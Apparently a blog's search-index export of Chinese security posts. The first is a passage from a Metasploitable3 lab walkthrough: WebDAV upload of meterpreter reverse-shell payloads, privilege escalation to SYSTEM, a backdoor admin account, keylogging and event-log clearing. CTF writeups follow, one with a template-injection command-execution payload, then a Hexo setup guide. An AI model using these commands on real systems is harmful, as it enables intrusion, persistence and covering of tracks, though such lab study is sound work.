PHP/5.3.10 DAV/2)[*] Nmap: 9200/tcp open http Elasticsearch REST API 1.1.1 (name: Jean Grey-Summers; Lucene 4.7)[*] Nmap: MAC Address: 00:0C:29:E5:F7:74 (VMware)[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows[*] Nmap: Read data files from: /usr/bin/../share/nmap[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 2837.85 seconds[*] Nmap: Raw packets sent: 41973 (1.847MB) | Rcvd: 2269 (110.612KB) 目录扫描 基于msf的dir_scanner 1234567891011121314151617181920212223242526272829303132333435363738394041424344msf5 &gt; search dir_scanMatching Modules================ Name Disclosure Date Rank Check Description ---- --------------- ---- ----- ----------- auxiliary/scanner/http/dir_scanner normal Yes HTTP Directory Scannermsf5 &gt; use auxiliary/scanner/http/dir_scanner msf5 auxiliary(scanner/http/dir_scanner) &gt; show options Module options (auxiliary/scanner/http/dir_scanner): Name Current Setting Required Description ---- --------------- -------- ----------- DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt no Path of word dictionary to use PATH / yes The path to identify files Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target address range or CIDR identifier RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads VHOST no HTTP server virtual hostmsf5 auxiliary(scanner/http/dir_scanner) &gt; set threads 30threads =&gt; 30msf5 auxiliary(scanner/http/dir_scanner) &gt; set rhosts 192.168.114.29rhosts =&gt; 192.168.114.29msf5 auxiliary(scanner/http/dir_scanner) &gt; set rport 8585rport =&gt; 8585msf5 auxiliary(scanner/http/dir_scanner) &gt; run[*] Detecting error code[*] Using code '404' as not found for 192.168.114.29[+] Found http://192.168.114.29:8585/.../ 403 (192.168.114.29)[+] Found http://192.168.114.29:8585/cgi-bin/ 403 (192.168.114.29)[+] Found http://192.168.114.29:8585/icons/ 404 (192.168.114.29)[+] Found http://192.168.114.29:8585/phpmyadmin/ 403 (192.168.114.29)[+] Found http://192.168.114.29:8585/uploads/ 200 (192.168.114.29)[+] Found http://192.168.114.29:8585/wordpress/ 200 (192.168.114.29)[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 发现文件上传路径/uploads DAVTest上传测试12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152root@kali:~# davtest -url http://192.168.114.29:8585/uploads******************************************************** Testing DAV connectionOPEN SUCCEED: http://192.168.114.29:8585/uploads********************************************************NOTE Random string for this session: NBIRksdIG8d******************************************************** Creating directoryMKCOL FAIL******************************************************** Sending test filesPUT jhtml SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtmlPUT pl SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.plPUT shtml SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtmlPUT txt SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txtPUT aspx SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspxPUT php SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.phpPUT cfm SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfmPUT jsp SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jspPUT cgi SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgiPUT html SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.htmlPUT asp SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp******************************************************** Checking for test file executionEXEC jhtml FAILEXEC pl FAILEXEC shtml FAILEXEC txt SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txtEXEC aspx FAILEXEC php SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.phpEXEC cfm FAILEXEC jsp FAILEXEC cgi FAILEXEC html SUCCEED: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.htmlEXEC asp FAIL********************************************************/usr/bin/davtest Summary:PUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtmlPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.plPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtmlPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txtPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspxPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.phpPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfmPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jspPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgiPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.htmlPUT File: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspExecutes: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txtExecutes: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.phpExecutes: http://192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html 发现能成功上传txt,php,html 制作php木马12345root@kali:~# msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.114.176 LPORT=11111 -f raw &gt; ~/Desktop/11111.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 30659 bytes 上传一句话菜刀连接也行,但这里主要是基于metasploit的学习，最终远控，权限提升 向目标传马1234567root@kali:~# davtest -url http://192.168.114.29:8585/uploads -uploadfile ~/Desktop/11111.php -uploadloc 11111.php******************************************************** Testing DAV connectionOPEN SUCCEED: http://192.168.114.29:8585/uploads******************************************************** unless Uploading fileUpload succeeded: http://192.168.114.29:8585/uploads/11111.php 反弹shell123456789101112131415161718192021222324252627282930313233msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcppayload =&gt; php/meterpreter_reverse_tcpmsf5 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- -----------Payload options (php/meterpreter_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Wildcard Targetmsf5 exploit(multi/handler) &gt; set lhost 192.168.114.176lhost =&gt; 192.168.114.176msf5 exploit(multi/handler) &gt; set lport 11111lport =&gt; 11111msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.114.176:11111 攻击机访问一下http://192.168.114.29:8585/uploads/11111.php 123[*] Meterpreter session 1 opened (192.168.114.176:11111 -&gt; 192.168.114.29:53286) at 2019-01-23 14:44:18 +0800meterpreter &gt; 成功弹shell ms18_8120提权 查看当前用户 12meterpreter &gt; getuidServer username: LOCAL SERVICE (0) 进入shell查systeminfo 1234567891011121314meterpreter &gt; shellProcess 4520 created.Channel 0 created.Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\wamp\bin\apache\Apache2.2.21&gt;systeminfoTerminate channel 0? [y/N] y[-] Error running command shell: Rex::TimeoutError Operation timed out.meterpreter &gt; sysinfo[-] Error running command sysinfo: Rex::TimeoutError Operation timed out.meterpreter &gt; [*] 192.168.114.29 - Meterpreter session 2 closed. Reason: Died 桥接模式下，因为多人共用路由网络太差了，会话很容易断，现在改为NAT模式测试 12攻击机:192.168.75.128靶机:192.168.75.134 构造exe反弹shell上传到靶机 1234567891011121314root@kali:~# msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.75.128 LPORT=2222 -f exe -o ~/Desktop/2222.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 179779 bytesFinal size of exe file: 254976 bytesSaved as: /root/Desktop/2222.exeroot@kali:~# davtest -url http://192.168.75.134:8585/uploads -uploadfile ~/Desktop/2222.exe -uploadloc 2222.exe******************************************************** Testing DAV connectionOPEN SUCCEED: http://192.168.75.134:8585/uploads******************************************************** unless Uploading fileUpload succeeded: http://192.168.75.134:8585/uploads/2222.exe 通过shell运行exe,执行漏洞exp,权限从SERVICE提升为SYSTEM 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104meterpreter &gt; background [*] Backgrounding session 2...msf5 exploit(multi/handler) &gt; sessions -lActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter php/windows LOCAL SERVICE (0) @ METASPLOITABLE3 192.168.75.128:1111 -&gt; 192.168.75.134:54507 (192.168.75.134)msf5 exploit(multi/handler) &gt; set payload windows/meterpreter_reverse_tcppayload =&gt; windows/meterpreter_reverse_tcpmsf5 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- -----------Payload options (windows/meterpreter_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) EXTENSIONS no Comma-separate list of extensions to load EXTINIT no Initialization strings for extensions LHOST 192.168.75.128 yes The listen address (an interface may be specified) LPORT 1111 yes The listen portExploit target: Id Name -- ---- 0 Wildcard Targetmsf5 exploit(multi/handler) &gt; set lport 2222lport =&gt; 2222msf5 exploit(multi/handler) &gt; run -j -z[*] Exploit running as background job 0.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.75.128:2222 msf5 exploit(multi/handler) &gt; sessions -lActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter php/windows LOCAL SERVICE (0) @ METASPLOITABLE3 192.168.75.128:1111 -&gt; 192.168.75.134:54507 (192.168.75.134)msf5 exploit(multi/handler) &gt; sessions 2[*] Starting interaction with 2...meterpreter &gt; pwdC:\wamp\www\uploadsmeterpreter &gt; execute -f "C:\\wamp\\www\\uploads\\2222.exe"Process 6076 created.meterpreter &gt; [*] Meterpreter session 3 opened (192.168.75.128:2222 -&gt; 192.168.75.134:55448) at 2019-01-23 15:55:27 +0800meterpreter &gt; background [*] Backgrounding session 2...msf5 exploit(multi/handler) &gt; sessions -lActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter php/windows LOCAL SERVICE (0) @ METASPLOITABLE3 192.168.75.128:1111 -&gt; 192.168.75.134:54507 (192.168.75.134) 3 meterpreter x86/windows NT AUTHORITY\LOCAL SERVICE @ METASPLOITABLE3 192.168.75.128:2222 -&gt; 192.168.75.134:55448 (192.168.75.134)msf5 exploit(multi/handler) &gt; use exploit/windows/local/ms18_8120_win32k_privescmsf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; show options Module options (exploit/windows/local/ms18_8120_win32k_privesc): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on.Exploit target: Id Name -- ---- 0 Automaticmsf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; set session 3session =&gt; 3msf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; run[*] Started reverse TCP handler on 192.168.75.128:4444 [+] Exploit finished, wait for privileged payload execution to complete.[*] Sending stage (179779 bytes) to 192.168.75.134[*] Meterpreter session 4 opened (192.168.75.128:4444 -&gt; 192.168.75.134:55526) at 2019-01-23 15:57:19 +0800meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM 远程监控 可通过run vnc实现，也可以添加用户远程登陆1234567891011121314151617181920212223242526272829303132meterpreter &gt; net user[-] Unknown command: net.meterpreter &gt; shellProcess 5892 created.Channel 2 created.Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\wamp\bin\apache\Apache2.2.21&gt;net usernet userUser accounts for \\-------------------------------------------------------------------------------Administrator anakin_skywalker artoo_detoo ben_kenobi boba_fett c_three_pio chewbacca darth_vader greedo Guest han_solo jabba_hutt jarjar_binks kylo_ren lando_calrissian leia_organa luke_skywalker sshd sshd_server vagrant The command completed with one or more errors.C:\wamp\bin\apache\Apache2.2.21&gt;net user xiaoming 123456 /addnet user xiaoming 123456 /addThe command completed successfully.C:\wamp\bin\apache\Apache2.2.21&gt;net localgroup administrators xiaoming /addnet localgroup administrators xiaoming /addThe command completed successfully. PS:开启3389端口:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f 用户成功添加xiaoming1234567891011121314C:\wamp\bin\apache\Apache2.2.21&gt;net usernet userUser accounts for \\-------------------------------------------------------------------------------Administrator anakin_skywalker artoo_detoo ben_kenobi boba_fett c_three_pio chewbacca darth_vader greedo Guest han_solo jabba_hutt jarjar_binks kylo_ren lando_calrissian leia_organa luke_skywalker sshd sshd_server vagrant xiaoming The command completed with one or more errors. 简单后渗透尝试 查看是否为虚拟机 1234meterpreter &gt; run post/windows/gather/checkvm[*] Checking if METASPLOITABLE3 is a Virtual Machine .....[+] This is a VMware Virtual Machine 用户是否在线 123456789101112meterpreter &gt; quser[-] Unknown command: quser.meterpreter &gt; shellProcess 5828 created.Channel 3 created.Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\wamp\bin\apache\Apache2.2.21&gt;quserquser USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME vagrant console 1 Active none 1/22/2019 6:06 PM 检查闲置多久 12meterpreter &gt; idletimeUser has been idle for: 6 hours 20 mins 34 secs 多次截图对比管理员是否有操作 12meterpreter &gt; screenshotScreenshot saved to: /root/KMcxOzFn.jpeg 获取用户hash 键盘监控，不过没成功。。。 123456789meterpreter &gt; keyscan_startStarting the keystroke sniffer ...meterpreter &gt; keyscan_dumpDumping captured keystrokes...meterpreter &gt; meterpreter &gt; keyscan_stopStopping the keystroke sniffer... 还有很多骚操作日后尝试。。现在最重要就是清除痕迹(事件日志) clearev]]></content>
  </entry>
  <entry>
    <title><![CDATA[PCB2018部分Writeup]]></title>
    <url>%2F2018%2F12%2F05%2FPCB2018%E9%83%A8%E5%88%86Writeup%2F</url>
    <content type="text"><![CDATA[MISChack1t(复现队里大佬的) 题目给了完整的VM虚拟机压缩包，文件都经过了加密，但给出了密码bibinb 用密码登陆，发现无法直接登陆系统，还需要账号密码，简单的root等弱口令失败告终；在进入系统时进入GRUB进行恢复密码，发现根本没这个选项，一下子没了什么思路，开始面向搜索引擎 一番操作后大佬找这个破解VMX配置 可以通过配置CD-ROM的系统来加载这个文件 首先解密一下这个”Ubuntu 64-bit.vmx”,然后输入密码bibinb 发现报错 Error: File Ubuntu 64-bit.vmx is not a valid VMX file 原来是main.py脚本有瑕疵(果然我是做不出来的，因为遇到这个我是直接放弃的) 把N改成n就行,然后得到1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192Password:guestos = "ubuntu-64"virtualhw.version = "13"config.version = "8"numvcpus = "2"cpuid.coresPerSocket = "1"memsize = "2048"pciBridge0.present = "TRUE"pciBridge4.present = "TRUE"pciBridge4.virtualDev = "pcieRootPort"pciBridge4.functions = "8"pciBridge5.present = "TRUE"pciBridge5.virtualDev = "pcieRootPort"pciBridge5.functions = "8"pciBridge6.present = "TRUE"pciBridge6.virtualDev = "pcieRootPort"pciBridge6.functions = "8"pciBridge7.present = "TRUE"pciBridge7.virtualDev = "pcieRootPort"pciBridge7.functions = "8"vmci0.present = "TRUE"mks.enable3d = "true"scsi0:0.present = "TRUE"scsi0:0.deviceType = "disk"scsi0:0.fileName = "Ubuntu 64-bit-disk1.vmdk"scsi0:0.mode = "persistent"scsi0.virtualDev = "lsilogic"scsi0.present = "TRUE"sata0.present = "TRUE"vmci0.unrestricted = "false"vcpu.hotadd = "true"mem.hotadd = "true"powerType.powerOff = "soft"powerType.reset = "soft"powerType.suspend = "soft"toolscripts.afterpoweron = "true"toolscripts.afterresume = "true"toolscripts.beforepoweroff = "true"toolscripts.beforesuspend = "true"tools.syncTime = "false"nvram = "Ubuntu 64-bit-file1.nvram"virtualHW.productCompatibility = "hosted"extendedConfigFile = "Ubuntu 64-bit.vmxf"dataFileKey = "type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d"cryptoState = "encrypted"isolation.tools.copy.disable = "TRUE"isolation.tools.dnd.disable = "TRUE"isolation.tools.paste.disable = "TRUE"policy.vm.mvmtid = "52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29"rollingTier0.uid = "1"rollingTier0.interval = "86400"rollingTier0.maximum = "1"rollingTier0.clientFlags = "8"rollingTier0.displayName = "自动保护快照"rollingTier1.uid = "2"rollingTier1.interval = "604800"rollingTier1.baseTier = "1"rollingTier1.baseTierInterval = "7"rollingTier1.maximum = "1"rollingTier1.clientFlags = "8"rollingTier1.displayName = "自动保护快照"rollingTier2.uid = "3"rollingTier2.interval = "2419200"rollingTier2.baseTier = "1"rollingTier2.baseTierInterval = "28"rollingTier2.maximum = "1"rollingTier2.clientFlags = "8"rollingTier2.displayName = "自动保护快照"snapshot.numRollingTiers = "3"floppy0.present = "FALSE"uuid.bios = "56 4d 93 ac e2 84 54 3c-79 fd be 1f 62 8c 5d 67"uuid.location = "56 4d 93 ac e2 84 54 3c-79 fd be 1f 62 8c 5d 67"migrate.hostlog = ".\Ubuntu 64-bit-0dae80fb.hlog"scsi0:0.redo = ""pciBridge0.pciSlotNumber = "17"pciBridge4.pciSlotNumber = "21"pciBridge5.pciSlotNumber = "22"pciBridge6.pciSlotNumber = "23"pciBridge7.pciSlotNumber = "24"scsi0.pciSlotNumber = "16"vmci0.pciSlotNumber = "32"sata0.pciSlotNumber = "33"vmci0.id = "-119750326"monitor.phys_bits_used = "43"vmotion.checkpointFBSize = "4194304"vmotion.checkpointSVGAPrimarySize = "134217728"cleanShutdown = "TRUE"softPowerOff = "FALSE"svga.guestBackedPrimaryAware = "TRUE"rollingTier0.timeSincelast = "2008"rollingTier1.timeSincelast = "2008"rollingTier2.timeSincelast = "2008" ps:注意用py3,用py2总是报错~同时要把中文随便改成英文，不然编码错误 接下来就是配置CD-ROM了，看了一下自己的kali的vmx配置，主要多了如下 123sata0:0.deviceType = "cdrom-image"sata0:0.fileName = "D:\tongyongPE\kali-linux-2017.2-amd64.iso"sata0:0.present = "TRUE" 把它加到解密出来的vmx文件，然后再用bibinb密码加密回去 python3 main.py -e -D “Ubuntu 64-bit” -p bibinb dec.vmx myenc.mvx 将’myenc.mvx’替换掉原来的’Ubuntu 64-bit.vmx’ 在打开，发现 进入系统的过程按ESC进入Boot Menu,选择CD-ROM Drive,然后选择第一个 进入系统后看到一个20GB的磁盘,然后进去搜flag 4个文件放到一起打开 大佬太强~！！ Traffic_Light 题目给了一个红绿灯的gif文件 看了一下有1168帧 经过测试，最后发现绿灯为0，红灯为1，黄灯为空格 手动太累，还是写代码吧12345678910111213141516171819202122232425262728import os,sysimport hashlibdef GetFileMd5(filename): if not os.path.isfile(filename): return myhash = hashlib.md5() f = open(filename,'rb') while True: b = f.read(8096) if not b : break myhash.update(b) f.close() return myhash.hexdigest()flag = ""for i in range(0,1168): filepath="Traffic_Light/IMG%05d.bmp"%i if GetFileMd5(filepath)=="30a63c9d2ab0f27742a56ed5817723f8": #green flag += "0" elif GetFileMd5(filepath)=="fe8ab48b0f01daf1015607fdfa135621": #red flag += "1"print flagFLAG=''for i in range(len(flag)/8): FLAG+=chr(int(flag[i*8:i*8+8],2))print FLAG GreatWall 题目给一张长城的png，4M多，简单binwalk没发什么，考虑LSB 保存下来继续binwalk得到一张图片 长杠为1短杠为0,+为分隔符,好像只能手工写下来 What’s_this 题目拿到一张图片What’s_this.jpg binwalk，foremost得到 打开word文档，找到隐藏信息(并没卵用) docx后缀改zip，找到一个”有用的文件”I_Love_You.emf 再看2-stage.what这个文件很奇怪，JPG头，PNG尾，并且和zip2.zip里面的2-stage字节大小相同，但crc32不同，估计将2-stage.what改为PNG头后进行明文攻击改为如下 然后改后缀为png能打开(并没什么卵用) 但是可以发现此时2-stage.png和zip2.zip里面的2-stage的CRC32相同，明文攻击得到zip2.zip密码为Hello_Hi 得到如下(感觉被戏耍~，一堆没用的信息) 一下子没了思路，滚去睡觉 后来官方提示cloacked-pixel，用这个工具对2-stage.png提取，密码为Hello_Hi python lsb.py extract 2-stage.png out Hello_Hi 友情链接 得到加密压缩包zip3.zip和zip4.zip zip3.zip用CRC32碰撞得出文本内容为girl同时也是zip4的密码 很遗憾得到fake flag 此时“有用的文件”作用就来了，发现I_Love_You.emf和zip4.zip字节相同，尝试异或两个文件 12345678910111213141516#coding=utf8f1=open("I_Love_You.emf","rb")text1=f1.read()f2=open("zip4.zip","rb")text2=f2.read()data=''for i in range(len(text1)): data+=chr(ord(text1[i])^ord(text2[i]))f3=open("flag.zip","wb")f3.write(data)f1.close()f2.close()f3.close() Get flag]]></content>
  </entry>
  <entry>
    <title><![CDATA[hxb2018部分writeup]]></title>
    <url>%2F2018%2F11%2F23%2Fhxb2018%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[MiscFlow 流量取证，这个流量包中隐藏着一些秘密，你能找出来吗？ 拿到一个pacp流量包打开,发现全是802.11协议的,是WALN无线报文，并且经过加密，先解密 上kali用aircrack-ng直接跑 之前师兄的几个字典都不行，后来发现kali自带的很不错 wireshark导入密钥 导入后发现内容多了许多,字符串搜索flag Disk 磁盘隐写，这个磁盘上隐藏着一些秘密，你能找出来吗？ 题目给了一个-flat.vmdk文件,-flat.vmdk文件,-flat.vmdk文件(坑死了，简单的题目复杂化~) 本菜鸟本着面向搜索引擎做题的方法，看到了这个重建虚拟机丢失的虚拟磁盘vmdk，然后各种配置esxi环境失败,到后面也没连上去哈哈 正常操作一下，发现360压缩能打开（其它压缩软件貌似打不开的，360NB；后来发现360压缩可以看到NTFS交换数据流隐写的,如下面的ADS） flag0-3.txt都发现flag is not here;are you kidding? 然后看到flag0-3.txt:ads,打开发现是不可打印字符 用winhex打开发现一串二进制数，把4个文件的二进制数连起来转为ascii即可 还是太菜了，自从护网杯那道内存取证，一直对取证题敬畏，谁会想到这道题这么简单~ Hidden Write 没有套路，很常规的隐写，注意看图片末尾 题目给了一张龙猫的图片，放进winhex看一下 发现3个IHDR和IEND，理论存在3张图片，但binwalk只能得到原图一张，发现后两张少了PNG头，补上89504E470D0A1A0A 成功binwalk出3张图片 在分离出的第二张图片LSB发现一部分flag 第一和第三张是盲水印(字节小是原图，大有水印) 盲水印脚本 在最原始原图未发现最后一部分flag WebXmeO 注册账号，模板注入 1&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('grep -r -n "hxb" /home').read()&#125;&#125; show得到flag,或者登陆账号admin密码admin,发现里面有大佬遗留下来的做题痕迹，直接show拿走flag23333 ReverseReplace 有壳，kali下upx -d去壳 将数据提取出来，附上大佬脚本 CryptoCommon Crypto 密码学是个exe？不高兴又是Re ida打开程序大概知道是AES加密，从==sub_140001000== 中也可以看到一些赋值，估计是密钥 对于密文，前半部分是AES加密，后半部分则是decode(‘hex’) 脚本附上1234567from Crypto.Cipher import AESkey = '\x1b\x2e\x35\x46\x58\x6e\x72\x86\x9b\xa7\xb5\xc8\xd9\xef\xff\x0c'text='8aeb45c62003ba52e46c9600b3699b8c30386334623434393136633963356136'ciphertext = text.decode('hex')decodesys = AES.new(key)print decodesys.decrypt(ciphertext)[:16] + ciphertext[-16:] + '&#125;'#hxb2018&#123;d9e801ec08c4b44916c9c5a6&#125; 大佬的详细WP 总结还是太菜了，比赛期间本菜鸡都依靠强大的队友瑟瑟发抖的划水，别的大佬都在日主办方服务器~]]></content>
  </entry>
  <entry>
    <title><![CDATA[用hexo搭建本地博客]]></title>
    <url>%2F2018%2F11%2F11%2F%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[为什么搭博客？还不是因为无聊，学习是不可能的，这辈子都不可能学习；打LOL又嫌舍友太菜。开个玩笑，搭建自己的博客主要还是因为记录下自己的学习成长过程嘛，队里的大佬都有自己的Blog，自己也不好意思落下，有空的上传下自己的做题的writeup或复现还是不错的。 什么是Hexo？我不知道，网上教程多 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 前提环境 node.js Git ps:我是在Windows下做的，linux用户只需(git自带) 12sudo apt-get install nodejssudo apt-get install npm 出现以下情况则安装成功 然后你就可以快乐地在一个新文件夹里右键Git Bash Here $ npm install -g hexo-cli 成功如下 建站 在想要建站的文件夹中(必须是空文件夹)输入如下 hexo init #初始化该文件夹,需要点时间 在文件夹发现多了些文件目录如下 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes _config.yml是网站配置信息详情 继续刚才的文件夹输入如下安装组件 npm install 生成静态文件和启动服务器12hexo ghexo s 浏览器输入http://localhost:4000/出现如下，恭喜博客初步建成 下面介绍一些常用hexo命令new $ hexo new [layout] 新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 generate $ hexo generate 生成静态文件,等价于hexo g server $ hexo server 启动服务器等价于hexo s。默认情况下，访问网址为： http://localhost:4000/。 clean $ hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public)。 在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。 deploy hexo deploy 部署网站。等价于hexo d ps:用这个命令要先安装扩展 npm install hexo-deployer-git –save 部署到网站的一般流程123hexo cleanhexo ghexo d 不过此前一般在本地测试12hexo ghexo s]]></content>
  </entry>
  <entry>
    <title><![CDATA[MyFirst]]></title>
    <url>%2F2018%2F11%2F07%2FMyFirst%2F</url>
    <content type="text"><![CDATA[第一篇博客 Hello World！]]></content>
  </entry>
</search>
